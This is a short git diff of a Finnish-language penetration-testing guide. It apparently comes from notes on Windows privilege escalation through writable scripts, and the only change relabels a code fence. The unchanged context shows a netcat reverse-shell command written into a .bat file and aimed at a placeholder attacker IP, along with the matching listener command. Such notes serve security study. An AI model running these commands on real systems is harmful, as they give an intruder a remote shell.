@@ -62,6 +62,6 @@ Jos esim. \USERS -käyttäjillä kirjoitusoikeudet, voidaan tehdä reverse shell
 echo c:\polku\netcatiin\nc64.exe -e cmd.exe *Hyökkääjän IP* 9999 > C:\polku\scrriptiin\scripti.bat
 ```
 Netcat -kuuntelumoodiin omalle koneelle porttiin 9999:
-```bash
+```unix
 nc -ncvlp 9999
 ```
